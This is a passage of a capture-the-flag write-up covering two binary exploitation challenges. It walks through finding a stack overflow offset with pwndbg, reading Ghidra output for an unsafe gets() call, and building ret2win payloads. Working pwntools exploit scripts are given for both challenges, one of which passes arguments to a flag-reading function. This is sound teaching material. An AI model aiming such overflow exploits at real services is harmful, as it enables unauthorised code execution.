The **offset** in the context of a buffer overflow attack is the number of bytes that need to be written in order to overflow the buffer and reach the **return address** on the stack. This is a critical value because once the buffer is overflowed, the excess data can overwrite the return address, allowing you to control the program's execution flow.

```python
pwndbg echo
cyclic 200 # since buffer is 128 in size
run
(paste the cyclic pattern and hit enter)
```

![image](https://github.com/user-attachments/assets/a003cccf-c0fc-4a48-9519-cae98423dcce)



Notice the RSP register's address is overloaded with characters:

![image](https://github.com/user-attachments/assets/9a4af2eb-ad1e-4a8d-ad26-b46a031a96f5)

Copy the pattern ‘raaaaaaa’ and run `cyclic -l raaaaaaa`:

![image](https://github.com/user-attachments/assets/61357702-d874-4cc8-892b-940abbac74ed)


Now that we have that offset information at 136, we need the `win()` function's address. You can find it manually using `pwndbg` (or gef, gdb, etc) by opening the binary and running `info functions` and we will see `win()` at this memory address `0x0000000000401216`:

![image](https://github.com/user-attachments/assets/cfd48767-8922-40e5-809e-1906db8de36c)


Now with everything in place we can overflow the buffer and get the flag by automating this exploitation with Python:
```python
#!/usr/bin/env python3

from pwn import *

# Load the ELF file
elf = ELF('./echo')

# Offset and target address
offset = 136
target_address = elf.symbols['win']

# Craft the payload
payload = b'A' * offset + p64(target_address)
print(payload)

# If it's a local binary, use the following:
conn = process('./echo')

# Connect to the remote service (if needed)
#conn = remote('challenge.ctf.games', 31084)

# Send the payload
conn.sendline(payload)

# Interact with the shell (if successful)
conn.interactive()

```

Now you will see the flag returned to you (if this were a remote server, otherwise it will ask you to create a flag.txt file):

![image](https://github.com/user-attachments/assets/87e87207-7d02-4f5a-bfc0-82eaee138cce)

---

## Challenge 14: Additional Information Needed

### Problem Description

Author: @Soups71

Another binary exploit challenge., but this time it's going to take some more information for me to give you what you want.

Download the file(s) below.
Attachments: challenge.elf

### Solution

Running file against the binary to determine it is an elf binary:
```bash
challenge.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),  
dynamically linked, interpreter /lib/ld-linux.so.2,  
BuildID[sha1]=9833fc45a97733715b43eee3beed3f38264ccf79,  
for GNU/Linux 3.2.0, not stripped
```

Checking for protections with `pwn checksec challenge.elf`:
```bash
Arch: i386-32-little  
RELRO: Partial RELRO  
Stack: No canary found  
NX: NX unknown - GNU_STACK missing  
PIE: No PIE (0x8048000)  
Stack: Executable  
RWX: Has RWX segments  
Stripped: No
```

Since there is no stack canary found we can overflow the buffer among other things. When you run the binary you will see: 

![image](https://github.com/user-attachments/assets/28c4e4a7-ed14-4cf6-9e8e-6896229a9700)


Examining the source code through GHIDRA, in the main function tells us that an insecure `GETS()` function is causing a buffer overflow:
```c
undefined4 main(void)  
  
{  
char buffer [32];  
  
buffer_init();  
puts("Welcome to this simple pwn challenge...");  
puts("All you have to do is make a call to the `getFlag()` function. That\'s it!");  
gets(buffer);  
return 0;  
}
```

Then there is the `getFlag()` function:
```c
undefined4 getFlag(int param_1,int param_2)  
  
{  
undefined4 uVar1;  
char local_3c [48];  
FILE *local_c;  
  
if (param_1 * param_2 == 0x23) {  
local_c = fopen("flag.txt","r");  
if (local_c != (FILE *)0x0) {  
fgets(local_3c,0x30,local_c);  
puts(local_3c);  
fclose(local_c);  
}  
uVar1 = 0;  
}  
else {  
puts("Nope!");  
uVar1 = 0xffffffff;  
}  
return uVar1;  
}
```

Reading the contents of this function tells us that the multiplication of `0x23` (hexadecimal) or `35` in decimal, is what is required.

This is a Ret2Win challenge with parameters:
```python
#!/usr/bin/env python3

# Importing pwntools
from pwn import *

# Setting up the process for hte local binary, interacting with 'p' object
p = process("./challenge.elf") # Or remote("host", port)  

# p = remote('challenge.ctf.games', 31753)  

# Load the elf binary
elf = ELF('./challenge.elf')  

# Getting the address of the getFlag function
getflag_addr = elf.symbols['getFlag']  

# Create a string of 40 characters of A to overflow the buffer
# overwrite the return address
# Convert the address of getFlag to a 32-bit little endian format to be used
# as a return address. # Placeholder at p32(0x0) and maths for 35 expected num
# to bypass the check for 5x7=35
payload = b"A" * 40 + p32(getflag_addr) + p32(0x0) + p32(7) + p32(5)  

# Sending the payload
p.sendline(payload)  

# Receive the output and decode it to a readable format
print(p.recvall().decode())
```

Then we receive the flag as expected:

![image](https://github.com/user-attachments/assets/59f8b737-fb23-469d-863d-aab2cccbe536)

---

## Conclusion

In this CTF event, I had the opportunity to apply various cybersecurity techniques and tools. Each challenge provided unique problems, ranging from cryptography to web exploitation and reverse engineering.

Unfortunately that is as far as I was able to get with the time constraints I had, and limitations of skills at the given time for tackling the other reverse engineering problems.

Since I have the files locally I will be experimenting with them and attempting to add more of the solutions to this repository over time, with help from other creators resources.

I hope this writeup helps others who are interested in solving similar challenges and learning more about cybersecurity. If you have any questions or want to discuss any of the techniques used, feel free to reach out!

---
